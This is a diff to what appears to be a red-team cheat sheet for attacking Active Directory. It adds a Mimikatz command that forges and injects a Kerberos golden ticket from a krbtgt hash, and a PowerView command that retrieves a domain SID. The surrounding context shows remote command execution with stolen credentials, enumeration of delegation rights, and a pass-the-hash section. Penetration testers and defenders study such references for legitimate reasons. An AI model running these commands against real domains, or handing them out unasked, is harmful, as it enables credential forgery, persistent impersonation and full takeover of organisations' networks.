@@ -251,6 +251,14 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 ```
 
 &nbsp;
+
+**[+] Create golden ticket using Mimikatz**
+
+```powershell
+kerberos::golden /user:Hitman /domain:DOMAIN /sid:DOMAIN-SID /krbtgt:HASH /ticket:tgt /ptt
+```
+
+&nbsp;
 &nbsp;
 
 ## Pass the hash
@@ -352,6 +360,14 @@ Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 // Computers
 
 Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
+```
+
+&nbsp;
+
+**[+] Get specific domain SID (Need PowerView.ps1)**
+
+```powershell
+Get-DomainSID -Domain funcorp.local
 ```
 
 &nbsp;
